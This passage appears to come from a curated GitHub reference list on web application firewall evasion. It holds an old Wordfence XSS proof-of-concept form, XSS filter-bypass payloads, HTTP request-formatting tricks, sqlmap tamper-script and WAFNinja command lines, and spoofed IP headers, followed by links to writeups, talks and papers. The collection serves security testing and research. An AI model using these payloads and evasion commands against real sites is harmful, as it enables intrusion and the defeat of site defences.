- [XSS Exploit](https://www.securityfocus.com/bid/56159/info) by [@MustLive](https://www.exploit-db.com/?author=1293) (>= v3.3.5)
```
<html>
<head>
<title>Wordfence Security XSS exploit (C) 2012 MustLive. 
http://websecurity.com.ua</title>
</head>
<body onLoad="document.hack.submit()">
<form name="hack" action="http://site/?_wfsf=unlockEmail" method="post">
<input type="hidden" name="email" 
value="<script>alert(document.cookie)</script>">
</form>
</body>
</html>
```
- [Other XSS Bypasses](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
```
<meter onmouseover="alert(1)"
'">><div><meter onmouseover="alert(1)"</div>"
>><marquee loop=1 width=0 onfinish=alert(1)>
```

### Apache Generic
- Writing method type in lowercase by [@i_bo0om](http://twitter.com/i_bo0om)
```
get /login HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

### IIS Generic
- Tabs before method by [@i_bo0om](http://twitter.com/i_bo0om)
```
    GET /login.php HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

## Awesome Tools
### Fingerprinting:
__1. Fingerprinting with [NMap](https://nmap.org)__:  
Source: [GitHub](https://github.com/nmap/nmap) | [SVN](http://svn.nmap.org)
- Normal WAF fingerprinting  
`nmap --script=http-waf-fingerprint <target>`

- Intensive WAF fingerprinting  
`nmap --script=http-waf-fingerprint  --script-args http-waf-fingerprint.intensive=1 <target>`

- Generic detection  
` nmap --script=http-waf-detect <target>`

__2. Fingerprinting with [identYwaf](https://github.com/stamparm/identywaf)__:  
Source: [GitHub](https://github.com/stamparm/identywaf)
```
python identYwaf.py --delay=2 --proxy=<proxy> <target>
```

### Testing:
- [WAFBench](https://github.com/microsoft/wafbench) - A WAF performance testing suite by [Microsoft](https://github.com/microsoft).
- [WAF Testing Framework](https://www.imperva.com/lg/lgw_trial.asp?pid=483) - A WAF testing tool by [Imperva](https://imperva.com).

### Evasion:  
__1. Evading WAFs with [SQLMap Tamper Scripts](https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3)__:
- General Tamper Testing
```
sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
- MSSQL Tamper Testing
```
sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
- MySQL Tamper Testing
```
sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
``` 
- Generic Tamper Testing 
```
sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```

__2. Evading WAFs with [WAFNinja](https://waf.ninja/)__  
Source: [GitHub](https://github.com/khalilbijjou/wafninja)
- Fuzzing  
`python wafninja.py fuzz -u <target> -t xss`

- Bypassing  
`python wafninja.py bypass -u <target> -p "name=<payload>&Submit=Submit" -t xss`

- Insert Fuzzing  
`python wafninja.py insert-fuzz -i select -e select -t sql`


__3. Evading WAFs with [WhatWaf](https://github.com/ekultek/whatwaf)__:  
Source: [GitHub](https://github.com/ekultek/whatwaf)
```
whatwaf -u <target> --ra --throttle 2
```

__4. Evading with [Bypass WAF](https://www.codewatch.org/blog/?p=408) - BurpSuite__:  
Source: [Burp Suite App Store](https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c)
- Bypass WAF adds some headers to evade some WAF products:
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```
- Create a session handling rule in Burp that invokes this extension.
- Modify the scope to include applicable tools and URLs.
- Configure the bypass options on the "Bypass WAF" tab.

## Blogs and Writeups
- [Web Application Firewall (WAF) Evasion Techniques #1](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) - By [@Secjuice](https://www.secjuice.com).
- [Web Application Firewall (WAF) Evasion Techniques #2](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) - By [@Secjuice](https://www.secjuice.com).
- [Web Application Firewall (WAF) Evasion Techniques #3](https://www.secjuice.com/web-application-firewall-waf-evasion/) - By [@Secjuice](https://www.secjuice.com).
- [ModSecurity SQL Injection Challenge: Lessons Learned](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) - By [@SpiderLabs](https://trustwave.com).
- [XXE that can Bypass WAF](https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0) - By [@WallArm](https://labs.wallarm.com).
- [SQL Injection Bypassing WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF) - By [@OWASP](https://owasp.com).
- [How To Reverse Engineer A Web Application Firewall Using Regular Expression Reversing](https://www.sunnyhoi.com/reverse-engineer-web-application-firewall-using-regular-expression-reversing/) - By [@SunnyHoi](https://twitter.com/sunnyhoi).
- [Bypassing Web-Application Firewalls by abusing SSL/TLS](https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html) - By [@0x09AL](https://twitter.com/0x09al).
- [Request Encoding to Bypass WAFs](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/) - By [@Soroush Dalili](https://twitter.com/irsdl)

## Video Presentations
- [WAF Bypass Techniques Using HTTP Standard and Web Servers Behavior](https://www.youtube.com/watch?v=tSf_IXfuzXk) from [@OWASP](https://owasp.org).
- [Confessions of a WAF Developer: Protocol-Level Evasion of Web App Firewalls](https://www.youtube.com/watch?v=PVVG4rCFZGU) from [BlackHat USA 12](https://blackhat.com/html/bh-us-12).
- [Web Application Firewall - Analysis of Detection Logic](https://www.youtube.com/watch?v=dMFJLicdaC0) from [BlackHat](https://blackhat.com).
- [Bypassing Browser Security Policies for Fun & Profit](https://www.youtube.com/watch?v=P5R4KeCzO-Q) from [BlackHat](https://blackhat.com).
- [Web Application Firewall Bypassing](https://www.youtube.com/watch?v=SD7ForrwUMY) from [Positive Technologies](https://ptsecurity.com).
- [Fingerprinting Filter Rules of Web Application Firewalls - Side Channeling Attacks](https://www.usenix.org/conference/woot12/workshop-program/presentation/schmitt) from [@UseNix](https://www.usenix.com).
- [Evading Deep Inspection Systems for Fun and Shell](https://www.youtube.com/watch?v=BkmPZhgLmRo) from [BlackHat US 13](https://blackhat.com/html/bh-us-13).
- [Bypass OWASP CRS && CWAF (WAF Rule Testing - Unrestricted File Upload)](https://www.youtube.com/watch?v=lWoxAjvgiHs) from [Fools of Security](https://www.youtube.com/channel/UCEBHO0kD1WFvIhf9wBCU-VQ).
- [WAFs FTW! A modern devops approach to security testing your WAF](https://www.youtube.com/watch?v=05Uy0R7UdFw) from [AppSec USA 17](https://www.youtube.com/user/OWASPGLOBAL).
- [Web Application Firewall Bypassing WorkShop](https://www.youtube.com/watch?v=zfBT7Kc57xs) from [OWASP](https://owasp.com).
- [Bypassing Modern WAF's Exemplified At XSS by Rafay Baloch](https://www.youtube.com/watch?v=dWLpw-7_pa8) from [Rafay Bloch](http://rafaybaloch.com).
- [WTF - WAF Testing Framework](https://www.youtube.com/watch?v=ixb-L5JWJgI) from [AppSecUSA 13](https://owasp.org).
- [The Death of a Web App Firewall](https://www.youtube.com/watch?v=mB_xGSNm8Z0) from [Brian McHenry](https://www.youtube.com/channel/UCxzs-N2sHnXFwi0XjDIMTPg).
- [Adventures with the WAF](https://www.youtube.com/watch?v=rdwB_p0KZXM) from [BSides Manchester](https://www.youtube.com/channel/UC1mLiimOTqZFK98VwM8Ke4w).
- [Bypassing Intrusion Detection Systems](https://www.youtube.com/watch?v=cJ3LhQXzrXw) from [BlackHat](https://blackhat.com).

## Presentations & Research Papers
### Research Papers:
- [Protocol Level WAF Evasion](papers/Qualys%20Guide%20-%20Protocol-Level%20WAF%20Evasion.pdf) - A protocol level WAF evasion techniques and analysis by [Qualys](https://www.qualys.com).
- [Neural Network based WAF for SQLi](papers/Artificial%20Neural%20Network%20based%20WAF%20for%20SQL%20Injection.pdf) - A paper about building a neural network based WAF for detecting SQLi attacks.
- [Bypassing Web Application Firewalls with HTTP Parameter Pollution](papers/Bypassing%20Web%20Application%20Firewalls%20with%20HTTP%20Parameter%20Pollution.pdf) - A research paper from [Exploit DB](https://exploit-db.com) about effectively bypassing WAFs via HTTP Parameter Pollution.
- [Poking A Hole in the Firewall](papers/Poking%20A%20Hole%20In%20The%20Firewall.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about modern firewall analysis.
- [Modern WAF Fingerprinting and XSS Filter Bypass](papers/Modern%20WAF%20Fingerprinting%20and%20XSS%20Filter%20Bypass.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about WAF fingerprinting and bypassing XSS filters.
- [WAF Evasion Testing](papers/SANS%20Guide%20-%20WAF%20Evasion%20Testing.pdf) - A WAF evasion testing guide from [SANS](https://www.sans.org).
- [WASC WAF Evaluation Criteria](papers/WASC%20WAF%20Evaluation%20Criteria.pdf) - A guide for WAF Evaluation from [Web Application Security Consortium](http://www.webappsec.org).
- [WAF Evaluation and Analysis](papers/Web%20Application%20Firewalls%20-%20Evaluation%20and%20Analysis.pdf) - A paper about WAF evaluation and analysis of 2 most used WAFs (ModSecurity & WebKnight) from [University of Amsterdam](http://www.uva.nl).
- [Bypassing all WAF XSS Filters](papers/Evading%20All%20Web-Application%20Firewalls%20XSS%20Filters.pdf) - A paper about bypassing all XSS filter rules and evading WAFs for XSS.
- [Beyond SQLi - Obfuscate and Bypass WAFs](papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt) - A research paper from [Exploit Database](https://exploit-db.com) about obfuscating SQL injection queries to effectively bypass WAFs.
- [Bypassing WAF XSS Detection Mechanisms](papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf) - A research paper about bypassing XSS detection mechanisms in WAFs. 

### Presentations:
- [Methods to Bypass a Web Application Firewall](presentrations/Methods%20To%20Bypass%20A%20Web%20Application%20Firewall.pdf) - A presentation from [PT Security](https://www.ptsecurity.com) about bypassing WAF filters and evasion.
- [Web Application Firewall Bypassing (How to Defeat the Blue Team)](presentation/Web%20Application%20Firewall%20Bypassing%20(How%20to%20Defeat%20the%20Blue%20Team).pdf) - A presentation about bypassing WAF filtering and ruleset fuzzing for evasion by [@OWASP](https://owasp.org). 
- [WAF Profiling & Evasion Techniques](presentations/OWASP%20WAF%20Profiling%20&%20Evasion.pdf) - A WAF testing and evasion guide from [OWASP](https://www.owasp.org).
- [Protocol Level WAF Evasion Techniques](presentations/BlackHat%20US%2012%20-%20Protocol%20Level%20WAF%20Evasion%20(Slides).pdf) - A presentation at about efficiently evading WAFs at protocol level from [BlackHat US 12](https://www.blackhat.com/html/bh-us-12/).
- [Analysing Attacking Detection Logic Mechanisms](presentations/BlackHat%20US%2016%20-%20Analysis%20of%20Attack%20Detection%20Logic.pdf) - A presentation about WAF logic applied to detecting attacks from [BlackHat US 16](https://www.blackhat.com/html/bh-us-16/).
- [WAF Bypasses and PHP Exploits](presentations/WAF%20Bypasses%20and%20PHP%20Exploits%20(Slides).pdf) - A presentation about evading WAFs and developing related PHP exploits.
- [Our Favorite XSS Filters/IDS and how to Attack Them](presentations/Our%20Favourite%20XSS%20WAF%20Filters%20And%20How%20To%20Bypass%20Them.pdf) - A presentation about how to evade XSS filters set by WAF rules from [BlackHat USA 09](https://www.blackhat.com/html/bh-us-09/)
- [Playing Around with WAFs](presentations/Playing%20Around%20with%20WAFs.pdf) - A small presentation about WAF profiling and playing around with them from [Defcon 16](http://www.defcon.org/html/defcon-16/dc-16-post.html).
- [A Forgotten HTTP Invisiblity Cloak](presentation/A%20Forgotten%20HTTP%20Invisibility%20Cloak.pdf) - A presentation about techniques that can be used to bypass common WAFs from [BSides Manchester](https://www.bsidesmcr.org.uk/).

## Credits & License:
This work has been presented by [Infected Drake](https://twitter.com/0xInfection) [(0xInfection)](https://github.com/0xinfection) and is licensed under the [Apache 2.0 License](LICENSE). 
